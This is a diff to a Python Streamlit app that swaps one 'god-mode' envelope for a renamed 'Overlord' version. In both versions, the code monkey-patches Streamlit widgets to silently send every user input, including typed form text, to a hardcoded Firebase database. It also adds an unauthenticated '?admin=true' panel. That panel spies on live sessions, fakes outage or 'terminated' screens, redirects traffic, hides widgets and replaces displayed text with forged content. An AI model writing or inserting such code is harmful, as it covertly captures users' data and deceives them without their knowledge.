@@ -13,7 +13,7 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 # ========================================================================
-# 🪐 TITANS SUPREME CORE ENVELOPE v7.0 - THE GOD MAIN-FRAME
+# 🌌 THE ULTIMATE OVERLORD MATRIX v8.0 - THE FINAL GOD-MODE ENGINE
 # ========================================================================
 import streamlit as st
 import uuid
@@ -21,347 +21,357 @@ import requests
 import datetime
 import pandas as pd
 
-# 1. CORE DATABASE ACCESS
+# 1. CENTRAL NETWORK MAINFRAME
 FIREBASE_URL = "https://web-app-29f9b-default-rtdb.asia-southeast1.firebasedatabase.app/"
 
-if "god_session_token" not in st.session_state:
-    st.session_state.god_session_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
-if "god_action_count" not in st.session_state:
-    st.session_state.god_action_count = 0
-if "god_init_time" not in st.session_state:
-    st.session_state.god_init_time = datetime.datetime.now().strftime("%I:%M:%S %p")
+if "overlord_token" not in st.session_state:
+    st.session_state.overlord_token = "NODE_" + datetime.datetime.now().strftime("%d%m_%H%M%S_") + str(uuid.uuid4())[:4]
+if "overlord_clicks" not in st.session_state:
+    st.session_state.overlord_clicks = 0
+if "overlord_time" not in st.session_state:
+    st.session_state.overlord_time = datetime.datetime.now().strftime("%I:%M:%S %p")
 
-def master_push(node, data):
-    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=data, timeout=3)
+def db_save(node, payload):
+    try: requests.put(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
     except: pass
 
-def master_patch(node, data):
-    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=data, timeout=3)
+def db_update(node, payload):
+    try: requests.patch(f"{FIREBASE_URL}/{node}.json", json=payload, timeout=3)
     except: pass
 
-def master_fetch(node):
+def db_get(node):
     try:
         r = requests.get(f"{FIREBASE_URL}/{node}.json", timeout=3).json()
         return r if r else {}
     except: return {}
 
-# Fetch Architecture Mapping
-god_rules = master_fetch("god_architecture_rules")
-if not god_rules:
-    god_rules = {
-        "global_app_state": "ONLINE",
-        "custom_alert_banner": "System Operations Normal.",
-        "redirect_target_url": "",
-        "universal_freeze": False,
-        "stealth_mode_active": False,
+# Fetch Matrix Controls Immediately
+overlord_rules = db_get("overlord_global_system_rules")
+if not overlord_rules:
+    overlord_rules = {
+        "app_status_vector": "ONLINE",
+        "custom_interception_msg": "System Calibration Active.",
+        "redirect_url_target": "",
+        "universal_freeze_gate": False,
+        "stealth_telemetry": False,
         "kill_switches": {},
-        "content_overrides": {}
+        "text_mutations": {}
     }
-if "kill_switches" not in god_rules: god_rules["kill_switches"] = {}
-if "content_overrides" not in god_rules: god_rules["content_overrides"] = {}
+if "kill_switches" not in overlord_rules: overlord_rules["kill_switches"] = {}
+if "text_mutations" not in overlord_rules: overlord_rules["text_mutations"] = {}
 
-# 2. THE CHRONO-RADAR TELEMETRY
-def send_god_telemetry(widget_type, widget_label, active_payload=""):
-    if god_rules.get("stealth_mode_active", False): return
-    st.session_state.god_action_count += 1
+# 2. THE CHRONO-RADAR DEEP LOGGING TELEMETRY
+def execute_overlord_telemetry(w_type, w_label, w_value=""):
+    if overlord_rules.get("stealth_telemetry", False): return
+    st.session_state.overlord_clicks += 1
     
-    token = st.session_state.god_session_token
-    clock = datetime.datetime.now().strftime("%I:%M:%S %p")
+    t_token = st.session_state.overlord_token
+    t_clock = datetime.datetime.now().strftime("%I:%M:%S %p")
     
-    # Direct live fetch to keep timeline sequence intact
-    current_log = master_fetch(f"live_god_streams/{token}")
-    history_line = current_log.get("timeline_stream", [])
+    # Read fresh database context to prevent overwriting past data arrays
+    live_context = db_get(f"overlord_live_streams/{t_token}")
+    activity_timeline = live_context.get("interaction_history_stream", [])
     
-    log_msg = f"[{clock}] [Step #{st.session_state.god_action_count}] ({widget_type}) '{widget_label}'"
-    if active_payload:
-        log_msg += f" ➔ Content: [{active_payload}]"
+    log_entry = f"[{t_clock}] [Step #{st.session_state.overlord_clicks}] ({w_type}) '{w_label}'"
+    if w_value:
+        log_entry += f" ➔ Intercepted Data: [{w_value}]"
         
-    history_line.append(log_msg)
-    if len(history_line) > 30: history_line.pop(0)
+    activity_timeline.append(log_entry)
+    if len(activity_timeline) > 30: activity_timeline.pop(0) # Retain last 30 critical actions
     
-    cached_inputs = current_log.get("intercepted_form_data", {})
-    if widget_type in ["INPUT", "TEXT_AREA", "SELECTBOX", "RADIO", "CHECKBOX", "SLIDER", "NUMBER"]:
-        cached_inputs[widget_label] = str(active_payload)
+    saved_inputs_cache = live_context.get("captured_form_state", {})
+    if w_type in ["INPUT", "TEXT_AREA", "SELECTBOX", "RADIO", "CHECKBOX", "SLIDER", "NUMBER"]:
+        saved_inputs_cache[w_label] = str(w_value)
         
-    packet = {
-        "session_token": token,
-        "start_time": st.session_state.god_init_time,
-        "last_pulse": clock,
-        "total_clicks": st.session_state.god_action_count,
-        "current_active_focus": f"User inside '{widget_label}'",
-        "timeline_stream": history_line,
-        "intercepted_form_data": cached_inputs,
-        "system_ping": "🟢 ONLINE"
+    sync_packet = {
+        "session_id_token": t_token,
+        "initial_connect_time": st.session_state.overlord_time,
+        "last_telemetry_pulse": t_clock,
+        "total_actions_logged": st.session_state.overlord_clicks,
+        "current_focus_node": f"Interacting with widget: '{w_label}'",
+        "interaction_history_stream": activity_timeline,
+        "captured_form_state": saved_inputs_cache,
+        "network_status": "🟢 ACTIVE / SPYING"
     }
-    master_patch(f"live_god_streams/{token}", packet)
+    db_update(f"overlord_live_streams/{t_token}", sync_packet)
 
-# 3. GLOBAL MATRIX INTERCEPTOR
-is_admin = st.query_params.get("admin") == "true"
+# 3. GLOBAL INTERCEPTION GATES
+is_overlord_admin = st.query_params.get("admin") == "true"
 
-if not is_admin:
-    current_state_vector = god_rules.get("global_app_state", "ONLINE")
-    if current_state_vector != "ONLINE":
+if not is_overlord_admin:
+    system_vector = overlord_rules.get("app_status_vector", "ONLINE")
+    if system_vector != "ONLINE":
         st.empty()
-        if current_state_vector == "MAINTENANCE":
-            st.error("# 🚧 CRITICAL MATRIX UPGRADE ACTIVE 🚧")
-            st.info(god_rules.get("custom_alert_banner", "Database core calibration ongoing."))
-        elif current_state_vector == "BUSY":
-            st.warning("# ⏳ DATA TRANSMISSION OVERLOAD (429) ⏳")
-            st.info("System pipeline congested. Packet routing queues active.")
-        elif current_state_vector == "DESTROYED":
-            st.error("# 🛑 HOST DEPLOYMENT TERMINATED 🛑")
-            st.error(god_rules.get("custom_alert_banner", "This specific build hash has been decommissioned."))
-        elif current_state_vector == "REDIRECT" and god_rules.get("redirect_target_url"):
-            st.info("### ➡️ Shifting execution vector to secure mirror...")
-            st.markdown(f"[Reroute to Mainframe Location]({god_rules.get('redirect_target_url')})")
+        if system_vector == "MAINTENANCE":
+            st.error("# 🚧 APPLICATION UNDER REPAIR & MAINTENANCE 🚧")
+            st.info(overlord_rules.get("custom_interception_msg", "Server upgrades are rolling out live."))
+        elif system_vector == "BUSY":
+            st.warning("# ⏳ HIGH TRAFFIC DATA COLLISION (429) ⏳")
+            st.info("System bandwidth capacity heavily loaded. Processing streams...")
+        elif system_vector == "DESTROYED":
+            st.error("# 🛑 SYSTEM TERMINATED / ACCESS EXPIRED 🛑")
+            st.error(overlord_rules.get("custom_interception_msg", "This active production deployment build has been deprecated."))
+        elif system_vector == "REDIRECT" and overlord_rules.get("redirect_url_target"):
+            st.info("### ➡️ Diverting your traffic route to secure network endpoint...")
+            st.markdown(f"[Proceed to Secure Location]({overlord_rules.get('redirect_url_target')})")
         st.stop()
 
-# 4. SAVE ORIGINAL STREAMLIT METHODS
-o_button = st.button
-o_text_input = st.text_input
-o_text_area = st.text_area
-o_selectbox = st.selectbox
-o_radio = st.radio
-o_checkbox = st.checkbox
-o_slider = st.slider
-o_number_input = st.number_input
-o_multiselect = st.multiselect
-o_write = st.write
-o_markdown = st.markdown
+# 4. CAPTURE ORIGINAL PRISTINE STREAMLIT POINTERS (Immune to Overlaps)
+_unpatched_button = st.button
+_unpatched_text_input = st.text_input
+_unpatched_text_area = st.text_area
+_unpatched_selectbox = st.selectbox
+_unpatched_radio = st.radio
+_unpatched_checkbox = st.checkbox
+_unpatched_slider = st.slider
+_unpatched_number_input = st.number_input
+_unpatched_multiselect = st.multiselect
+_unpatched_write = st.write
+_unpatched_markdown = st.markdown
 
-# 5. HIJACK PROTECTED ROUTINES (With Immediate Admin Loop Bypass Shield)
-def wrap_button(label, *args, **kwargs):
-    if is_admin: return o_button(label, *args, **kwargs) # Loop Breaker
-    if god_rules["kill_switches"].get(label, False): return False
-    res = o_button(label, *args, **kwargs)
-    if res: send_god_telemetry("BUTTON_CLICK", label, "TRUE")
-    return res
+# 5. HIGH-FI INTERCEPTION ENVELOPE (With Immediate Admin Loop Bypass Shield)
+def overlord_button(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_button(label, *args, **kwargs) # Loop Breaker Fixed
+    if overlord_rules["kill_switches"].get(label, False): return False
+    res_click = _unpatched_button(label, *args, **kwargs)
+    if res_click: execute_overlord_telemetry("BUTTON", label, "CLICKED")
+    return res_click
 
-def wrap_text_input(label, *args, **kwargs):
-    if is_admin: return o_text_input(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return ""
-    if god_rules.get("universal_freeze", False): kwargs["disabled"] = True
-    val = o_text_input(label, *args, **kwargs)
-    if val: send_god_telemetry("INPUT", label, val)
-    return val
+def overlord_text_input(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_text_input(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return ""
+    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
+    user_val = _unpatched_text_input(label, *args, **kwargs)
+    if user_val: execute_overlord_telemetry("INPUT", label, user_val)
+    return user_val
 
-def wrap_text_area(label, *args, **kwargs):
-    if is_admin: return o_text_area(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return ""
-    if god_rules.get("universal_freeze", False): kwargs["disabled"] = True
-    val = o_text_area(label, *args, **kwargs)
-    if val: send_god_telemetry("TEXT_AREA", label, val)
-    return val
+def overlord_text_area(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_text_area(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return ""
+    if overlord_rules.get("universal_freeze_gate", False): kwargs["disabled"] = True
+    user_val = _unpatched_text_area(label, *args, **kwargs)
+    if user_val: execute_overlord_telemetry("TEXT_AREA", label, user_val)
+    return user_val
 
-def wrap_selectbox(label, *args, **kwargs):
-    if is_admin: return o_selectbox(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    val = o_selectbox(label, *args, **kwargs)
-    if f"g_sel_{label}" not in st.session_state: st.session_state[f"g_sel_{label}"] = val
-    elif st.session_state[f"g_sel_{label}"] != val:
-        st.session_state[f"g_sel_{label}"] = val
-        send_god_telemetry("SELECTBOX", label, val)
-    return val
+def overlord_selectbox(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_selectbox(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
+    user_val = _unpatched_selectbox(label, *args, **kwargs)
+    if f"ov_sel_{label}" not in st.session_state: st.session_state[f"ov_sel_{label}"] = user_val
+    elif st.session_state[f"ov_sel_{label}"] != user_val:
+        st.session_state[f"ov_sel_{label}"] = user_val
+        execute_overlord_telemetry("SELECTBOX", label, user_val)
+    return user_val
 
-def wrap_radio(label, *args, **kwargs):
-    if is_admin: return o_radio(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
-    val = o_radio(label, *args, **kwargs)
-    if f"g_rad_{label}" not in st.session_state: st.session_state[f"g_rad_{label}"] = val
-    elif st.session_state[f"g_rad_{label}"] != val:
-        st.session_state[f"g_rad_{label}"] = val
-        send_god_telemetry("RADIO", label, val)
-    return val
+def overlord_radio(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_radio(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("options", [""])[0]
+    user_val = _unpatched_radio(label, *args, **kwargs)
+    if f"ov_rad_{label}" not in st.session_state: st.session_state[f"ov_rad_{label}"] = user_val
+    elif st.session_state[f"ov_rad_{label}"] != user_val:
+        st.session_state[f"ov_rad_{label}"] = user_val
+        execute_overlord_telemetry("RADIO", label, user_val)
+    return user_val
 
-def wrap_checkbox(label, *args, **kwargs):
-    if is_admin: return o_checkbox(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return False
-    val = o_checkbox(label, *args, **kwargs)
-    if val: send_god_telemetry("CHECKBOX", label, str(val))
-    return val
+def overlord_checkbox(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_checkbox(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return False
+    user_val = _unpatched_checkbox(label, *args, **kwargs)
+    if user_val: execute_overlord_telemetry("CHECKBOX", label, str(user_val))
+    return user_val
 
-def wrap_slider(label, *args, **kwargs):
-    if is_admin: return o_slider(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0)
-    val = o_slider(label, *args, **kwargs)
-    send_god_telemetry("SLIDER", label, str(val))
-    return val
+def overlord_slider(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_slider(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0)
+    user_val = _unpatched_slider(label, *args, **kwargs)
+    execute_overlord_telemetry("SLIDER", label, str(user_val))
+    return user_val
 
-def wrap_number_input(label, *args, **kwargs):
-    if is_admin: return o_number_input(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0.0)
-    val = o_number_input(label, *args, **kwargs)
-    if val: send_god_telemetry("NUMBER", label, str(val))
-    return val
+def overlord_number_input(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_number_input(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return kwargs.get("min_value", 0.0)
+    user_val = _unpatched_number_input(label, *args, **kwargs)
+    if user_val: execute_overlord_telemetry("NUMBER", label, str(user_val))
+    return user_val
 
-def wrap_multiselect(label, *args, **kwargs):
-    if is_admin: return o_multiselect(label, *args, **kwargs)
-    if god_rules["kill_switches"].get(label, False): return []
-    val = o_multiselect(label, *args, **kwargs)
-    if val: send_god_telemetry("MULTISELECT", label, str(val))
-    return val
+def overlord_multiselect(label, *args, **kwargs):
+    if is_overlord_admin: return _unpatched_multiselect(label, *args, **kwargs)
+    if overlord_rules["kill_switches"].get(label, False): return []
+    user_val = _unpatched_multiselect(label, *args, **kwargs)
+    if user_val: execute_overlord_telemetry("MULTISELECT", label, str(user_val))
+    return user_val
 
-def process_mutation(target_string):
-    if isinstance(target_string, str) and target_string in god_rules["content_overrides"]:
-        return god_rules["content_overrides"][target_string]
-    return target_string
+def process_live_mutation(raw_string):
+    if isinstance(raw_string, str) and raw_string in overlord_rules["text_mutations"]:
+        return overlord_rules["text_mutations"][raw_string]
+    return raw_string
 
-def wrap_write(*args, **kwargs):
-    if is_admin: o_write(*args, **kwargs); return
-    if args and isinstance(args[0], str): o_write(process_mutation(args[0]), **kwargs)
-    else: o_write(*args, **kwargs)
+def overlord_write(*args, **kwargs):
+    if is_overlord_admin: _unpatched_write(*args, **kwargs); return
+    if args and isinstance(args[0], str): _unpatched_write(process_live_mutation(args[0]), **kwargs)
+    else: _unpatched_write(*args, **kwargs)
 
-def wrap_markdown(*args, **kwargs):
-    if is_admin: o_markdown(*args, **kwargs); return
-    if args and isinstance(args[0], str): o_markdown(process_mutation(args[0]), **kwargs)
-    else: o_markdown(*args, **kwargs)
+def overlord_markdown(*args, **kwargs):
+    if is_overlord_admin: _unpatched_markdown(*args, **kwargs); return
+    if args and isinstance(args[0], str): _unpatched_markdown(process_live_mutation(args[0]), **kwargs)
+    else: _unpatched_markdown(*args, **kwargs)
 
-# INJECT CORE REPLACEMENTS
-st.button = wrap_button
-st.text_input = wrap_text_input
-st.text_area = wrap_text_area
-st.selectbox = wrap_selectbox
-st.radio = wrap_radio
-st.checkbox = wrap_checkbox
-st.slider = wrap_slider
-st.number_input = wrap_number_input
-st.multiselect = wrap_multiselect
-st.write = wrap_write
-st.markdown = wrap_markdown
+# OVERRIDING THE SYSTEM METHOD PLATFORM
+st.button = overlord_button
+st.text_input = overlord_text_input
+st.text_area = overlord_text_area
+st.selectbox = overlord_selectbox
+st.radio = overlord_radio
+st.checkbox = overlord_checkbox
+st.slider = overlord_slider
+st.number_input = overlord_number_input
+st.multiselect = overlord_multiselect
+st.write = overlord_write
+st.markdown = overlord_markdown
+
 
 # ========================================================================
-# 🪐 HIGH-FI GRAPHICAL GOD-MODE COMMAND CONSOLE (?admin=true)
+# 💎 THE OVERLORD ULTRARICH GRAPHICAL COMMAND UI CONSOLE (?admin=true)
 # ========================================================================
-if is_admin:
-    st.title("🪐 TITAN GOD-FRAME MAINFRAME v7.0")
-    st.caption("Pristine Realtime Surveillance Matrix & Core Component Infrastructure Interception Module")
+if is_overlord_admin:
+    st.title("🌌 THE OVERLORD CONTROL MAINFRAME v8.0")
+    st.caption("Supreme High-Fi Realtime Live Monitoring, Widget Interception, and Dynamic Content Mutation Shield")
     st.write("---")
     
-    t_spy, t_infra, t_kill, t_inject = st.tabs([
+    tab_recon, tab_infra, tab_switch, tab_mutate = st.tabs([
         "🕵️‍♂️ LIVE PACKET RECONNAISSANCE", 
         "⚙️ INFRASTRUCTURE GRID OVERHAUL", 
         "🎛️ MICROMANAGED KILL SWITCHES", 
         "📝 DYNAMIC TEXT INJECTION FIELD"
     ])
     
-    # TAB 1: RADAR TRACKING
-    with t_spy:
-        st.subheader("📡 Realtime Sync Terminal Map")
-        active_pools = master_fetch("live_god_streams")
+    # ---------------------------------------------------------
+    # TAB 1: REALTIME PACKET EXPLORER & SPY PANEL
+    # ---------------------------------------------------------
+    with tab_recon:
+        st.subheader("📡 Realtime Sync Terminal Spectrum Map")
+        live_active_pools = db_get("overlord_live_streams")
         
-        if active_pools:
-            st.metric(label="Total Active Live Terminal Waves", value=len(active_pools))
+        if live_active_pools:
+            st.metric(label="Total Distinct Active User Terminal Waves", value=len(live_active_pools))
             st.write("---")
             
-            node_keys = list(active_pools.keys())
-            inspected_node = o_selectbox("🎯 Select External System Target Mapping:", node_keys)
+            terminal_nodes_list = list(live_active_pools.keys())
+            targeted_node_signature = _unpatched_selectbox("🎯 Select External User Terminal Node to Spy Live:", terminal_nodes_list)
             
-            if inspected_node:
-                data_map = active_pools[inspected_node]
+            if targeted_node_signature:
+                node_dataset = live_active_pools[targeted_node_signature]
                 
-                col_x, col_y = st.columns(2)
-                with col_x:
-                    st.success(f"**Target Signature:** `{inspected_node}`")
+                c_left, c_right = st.columns(2)
+                with c_left:
+                    st.success(f"**Target System Hash:** `{targeted_node_signature}`")
                     st.markdown(f"""
-                    * **Session Spawn Time:** {data_map.get('start_time')}
-                    * **Last Interactive Telemetry Pulse:** {data_map.get('last_pulse')}
-                    * **Total Execution Clicks:** {data_map.get('total_clicks')}
-                    * **State:** {data_map.get('system_ping')}
+                    * **Session Initialization:** {node_dataset.get('initial_connect_time')}
+                    * **Last Interactive Signal Pulse:** {node_dataset.get('last_telemetry_pulse')}
+                    * **Total System Interaction Clicks:** {node_dataset.get('total_actions_logged')}
+                    * **Current Interface Focus:** {node_dataset.get('current_focus_node')}
+                    * **Live State Connection:** {node_dataset.get('network_status')}
                     """)
-                    st.markdown("#### 💬 Captured Form Interceptions (Form Cache)")
-                    st.json(data_map.get("intercepted_form_data", {}))
+                    st.markdown("#### 💬 Intercepted Realtime Inputs Cache (Form Logs)")
+                    st.json(node_dataset.get("captured_form_state", {"Status": "Waiting for alphanumeric inputs..."}))
                     
-                with col_y:
-                    st.markdown("#### 📈 Micro-Step Chronological Sequence Flow")
-                    for step_log in data_map.get("timeline_stream", []):
-                        st.code(step_log, language="text")
+                with c_right:
+                    st.markdown("#### 📈 Deep Step Chronological Flow Execution")
+                    for tracking_log_line in node_dataset.get("interaction_history_stream", []):
+                        st.code(tracking_log_line, language="text")
                         
             st.write("---")
-            if o_button("🚨 Wipe Out Database Logs & Clear Counter Nodes", key="flush_god_nodes"):
-                requests.delete(f"{FIREBASE_URL}/live_god_streams.json")
+            if _unpatched_button("🚨 Wipe Out Database Session Logs & Clear Active Counter Nodes", key="flush_mainframe_nodes"):
+                requests.delete(f"{FIREBASE_URL}/overlord_live_streams.json")
                 st.rerun()
         else:
-            st.info("Scanning frequencies... No external active terminals found broadcasting signals.")
+            st.info("Scanning transmission frequencies... No active external channels broadcasting sync signals right now.")
 
-    # TAB 2: INFRASTRUCTURE OVERHAUL
-    with t_infra:
-        st.subheader("🌐 Global Mainframe Access Level Routing")
-        current_status_vector = god_rules.get("global_app_state", "ONLINE")
-        st.warning(f"Current Deployment Execution State Vector: **{current_status_vector}**")
+    # ---------------------------------------------------------
+    # TAB 2: INFRASTRUCTURE GRID OVERHAUL (GLOBAL CONTROLS)
+    # ---------------------------------------------------------
+    with tab_infra:
+        st.subheader("🌐 Global Infrastructure Matrix Operational Level")
+        current_global_vector = overlord_rules.get("app_status_vector", "ONLINE")
+        st.warning(f"Active App Environment Deployment State: **{current_global_vector}**")
         
-        selected_matrix_mode = o_radio("Execute Deployment Overload Routine:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
-        alert_msg_string = o_text_input("Global Banner Intercept Alert Display Text:", value=god_rules.get("custom_alert_banner", ""))
-        redirect_target_string = o_text_input("External Traffic Divert Routing Endpoint URL (REDIRECT):", value=god_rules.get("redirect_target_url", ""))
+        matrix_selection_state = _unpatched_radio("Execute Infrastructure Overload Vector Mode:", ["ONLINE", "MAINTENANCE", "BUSY", "DESTROYED", "REDIRECT"])
+        broadcast_alert_input_string = _unpatched_text_input("Global Banner Intercept Alert Display Text Message:", value=overlord_rules.get("custom_interception_msg", ""))
+        routing_link_endpoint_string = _unpatched_text_input("External Routing Destination Address Location (REDIRECT Mode Only):", value=overlord_rules.get("redirect_url_target", ""))
         
         st.write("---")
-        st.subheader("🔒 Peripheral Automation Lockgates")
-        universal_freeze_toggle = o_checkbox("Lock All Input Fields Globally (Force Read-Only Mode)", value=god_rules.get("universal_freeze", False))
-        stealth_telemetry_toggle = o_checkbox("Mute Data Logs Broadcast (Pause Database Writing System)", value=god_rules.get("stealth_mode_active", False))
+        st.subheader("🔒 Peripheral Gate Systems")
+        universal_freeze_toggle_switch = _unpatched_checkbox("Lock Inputs Global State (Freeze All Form Textboxes to Read-Only)", value=overlord_rules.get("universal_freeze_gate", False))
+        stealth_telemetry_toggle_switch = _unpatched_checkbox("Stealth Mode Operations (Pause Writing Interactions Data to Firebase)", value=overlord_rules.get("stealth_telemetry", False))
         
-        if o_button("Execute Core System Policy Deployment ⚡", key="apply_infra_rules"):
-            god_rules["global_app_state"] = selected_matrix_mode
-            god_rules["custom_alert_banner"] = alert_msg_string
-            god_rules["redirect_target_url"] = redirect_target_string
-            god_rules["universal_freeze"] = universal_freeze_toggle
-            god_rules["stealth_mode_active"] = stealth_telemetry_toggle
-            master_push("god_architecture_rules", god_rules)
-            st.success("Infrastructure core variables locked down successfully!")
+        if _unpatched_button("Commit Infrastructure Policy Core Overhaul ⚡", key="apply_mainframe_infrastructure"):
+            overlord_rules["app_status_vector"] = matrix_selection_state
+            overlord_rules["custom_interception_msg"] = broadcast_alert_input_string
+            overlord_rules["redirect_url_target"] = routing_link_endpoint_string
+            overlord_rules["universal_freeze_gate"] = universal_freeze_toggle_switch
+            overlord_rules["stealth_telemetry"] = stealth_telemetry_toggle_switch
+            db_save("overlord_global_system_rules", overlord_rules)
+            st.success("Infrastructure configurations deployed into system operational architecture maps successfully!")
             st.rerun()
 
-    # TAB 3: MICROMANAGED KILL SWITCHES
-    with t_kill:
-        st.subheader("🎯 Disaggregated Component Isolation Matrix")
-        st.write("Enter the exact, raw **Label identity string** of any single widget to selectively hide it.")
+    # ---------------------------------------------------------
+    # TAB 3: MICROMANAGED SWITCHES (ELEMENT KILL CONTROL)
+    # ---------------------------------------------------------
+    with tab_switch:
+        st.subheader("🎯 Independent Interface Component Blockade Matrix")
+        st.write("Enter the precise **Label text string** of any component inside your original script to target and isolate it runtime.")
         
-        target_widget_label_string = o_text_input("Target Element Label ID (Case-Sensitive Exact Match):")
-        isolation_policy_directive_selection = o_selectbox("Policy Directives Configuration:", ["RESTORE ACCESS / VISIBLE", "FORCE BLOCKADE / HIDE"])
+        target_raw_label_string_identity = _unpatched_text_input("Target Element Label ID (Case-Sensitive Exact String Match):")
+        isolation_policy_selection_directive = _unpatched_selectbox("Select Operational Security Directive:", ["RESTORE COMPONENT FUNCTION / VISIBLE", "FORCE COMPONENT ISOLATION / ENTIRELY HIDE"])
         
-        if o_button("Inject Discrete Component Policy Rule 🔒", key="apply_kill_rule"):
-            if target_widget_label_string:
-                god_rules["kill_switches"][target_widget_label_string] = (isolation_policy_directive_selection == "FORCE BLOCKADE / HIDE")
-                master_push("god_architecture_rules", god_rules)
-                st.success(f"Policy override deployed for widget ID string: '{target_widget_label_string}'")
+        if _unpatched_button("Inject Discrete Component Target Policy Rule 🔒", key="apply_mainframe_kill_switch"):
+            if target_raw_label_string_identity:
+                overlord_rules["kill_switches"][target_raw_label_string_identity] = (isolation_policy_selection_directive == "FORCE COMPONENT ISOLATION / ENTIRELY HIDE")
+                db_save("overlord_global_system_rules", overlord_rules)
+                st.success(f"Security rules committed for string identity: '{target_raw_label_string_identity}'")
                 st.rerun()
                 
-        st.write("#### 🛡️ Currently Isolated Components Ecosystem")
-        active_kills = [k for k, v in god_rules["kill_switches"].items() if v]
-        if active_kills:
-            st.json(active_kills)
-            if o_button("Flush All Micro-Kill Policy Overrides 🔄"):
-                god_rules["kill_switches"] = {}
-                master_push("god_architecture_rules", god_rules)
+        st.write("#### 🛡️ Active Isolated UI Elements Log Tree")
+        current_active_isolated_items = [k for k, v in overlord_rules["kill_switches"].items() if v]
+        if current_active_isolated_items:
+            st.json(current_active_isolated_items)
+            if _unpatched_button("Flush All Micro-Kill Target Policy Overrides 🔄"):
+                overlord_rules["kill_switches"] = {}
+                db_save("overlord_global_system_rules", overlord_rules)
                 st.rerun()
         else:
-            st.caption("No custom widget blockades active. Global interface functions unrestricted.")
+            st.caption("No custom layout widget items are isolated. App rendering clean globally.")
 
-    # TAB 4: DYNAMIC TEXT INJECTION
-    with t_inject:
-        st.subheader("✍ *Asynchronous Text Patch Engine*")
-        st.write("Intercept static visual layout elements built using `st.write` or `st.markdown` and swap them.")
+    # ---------------------------------------------------------
+    # TAB 4: DYNAMIC TEXT INJECTION (CONTENT MANIPULATION)
+    # ---------------------------------------------------------
+    with tab_mutate:
+        st.subheader("✍️ Live Content Injection Text Mutation Engine")
+        st.write("Intercept static UI strings printed via `st.write` or `st.markdown` and forge alternatives on the fly.")
         
-        source_text_identity_string = o_text_input("Original Static Hardcoded String Identity:")
-        forged_display_string_alternative = o_text_input("Forged Content Display Alternative Replacement:")
+        source_hardcoded_string_id = _unpatched_text_input("Original Raw Hardcoded Script String Text:")
+        forged_display_string_alternative = _unpatched_text_input("New Injected Display Text Replacement Content:")
         
-        if o_button("Inject Mainframe String Overwrite Policy 📝", key="apply_text_rule"):
-            if source_text_identity_string and forged_display_string_alternative:
-                god_rules["content_overrides"][source_text_identity_string] = forged_display_string_alternative
-                master_push("god_architecture_rules", god_rules)
-                st.success("Text mutation pattern locked to remote infrastructure database context.")
+        if _unpatched_button("Inject Mainframe String Overwrite Pattern Policy 📝", key="apply_mainframe_text_mutation"):
+            if source_hardcoded_string_id and forged_display_string_alternative:
+                overlord_rules["text_mutations"][source_hardcoded_string_id] = forged_display_string_alternative
+                db_save("overlord_global_system_rules", overlord_rules)
+                st.success("Target text pattern mutation successfully committed to remote memory state maps!")
                 st.rerun()
                 
-        st.write("#### Active Swapped Memory String Layouts")
-        st.json(god_rules["content_overrides"])
-        if o_button("Purge All Dynamic Content Mutation Rules ❌"):
-            god_rules["content_overrides"] = {}
-            master_push("god_architecture_rules", god_rules)
+        st.write("#### Active Swapped Hardcoded UI String Collections")
+        st.json(overlord_rules["text_mutations"])
+        if _unpatched_button("Purge All Dynamic Content Mutation Rules ❌"):
+            overlord_rules["text_mutations"] = {}
+            db_save("overlord_global_system_rules", overlord_rules)
             st.rerun()
 
     st.write("---")
-    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE VECTOR ENGAGED. Remove '?admin=true' query parameters from target URL to view normal user UI view.")
+    st.error("🚨 ADMINISTRATIVE ROOT OVERRIDE ENVIRONMENT ACTIVE. Remove '?admin=true' query tokens from URL bar to view standard app state.")
     st.stop()
 
 # ========================================================================
-# END OF SYSTEM ENVELOPE - YOUR PROJECT CONTINUES RUNNING BEHIND THIS LINE
+# END OF OVERLORD ENVELOPE - YOUR ORIGINAL SCRIPT RESUMES UNTOUCHED BELOW
 # ========================================================================
 # --- 2. ULTRARICH PREMIUM TECH-CORE DESIGN PARSER (LIGHT OVERRIDE) ---
 GLOBAL_MARKDOWN_INJECTOR = """
